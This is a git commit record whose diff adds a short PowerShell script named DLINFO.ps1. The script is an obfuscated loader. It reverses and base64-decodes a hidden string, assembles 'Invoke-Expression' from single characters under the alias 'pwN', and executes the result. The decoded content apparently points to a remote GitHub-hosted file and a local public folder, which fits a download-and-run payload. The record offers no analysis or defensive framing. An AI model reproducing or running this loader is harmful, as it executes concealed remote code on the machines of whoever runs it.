59b0c606d3a82ece8148d2ce8fa9186e6dd31e27
RAB301000001C3 <85085158+RAB301000001C3@users.noreply.github.com>
2023-11-13 09:42:58 +0800

    Add files via upload

---
+++ DLINFO.ps1
@@ -0,0 +1,4 @@
+$best64code = "==gCNgGdhBFdwlmcjNHJgYCI7gGdhBFdwlmcjNHJgUGbpZEd19ULgwmc1RCIpJXVtACdzVWdxVmUiV2VtU2avZnbJpQDiEzcw5ybm5WSHRmcvxEXw1WZUxFbhN2bMxVY0FGRwBXQcxGbhJ2dv52ccNnclNXVcpzQiASPggGdhBFdwlmcjNHJK0gIxMHcu8mZul2RkJ3bM9ibpFWbvIXZpNWYsdEZy9GTvMzQxADMwADMxAzMCFkUv02bj5CduVGdu92YyV2c1JWdoRXan5ydhJ3LvozcwRHdoJCI9ACbyVHJ" ;
+$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
+$LoAdCOde = [sYsTEm.texT.eNCOdING]::utF8.getstRIng([systEm.COnVErt]::FRoMBASe64sTrinG("$baSe64")) ;
+$pwN = "I"+"N"+"v"+"O"+"K"+"e"+"-"+"e"+"x"+"p"+"R"+"E"+"S"+"s"+"i"+"o"+"N" ; NEW-alIAs -nAmE pWn -VAlUE $pwN -fORCe ; pwN $lOadcOde ;
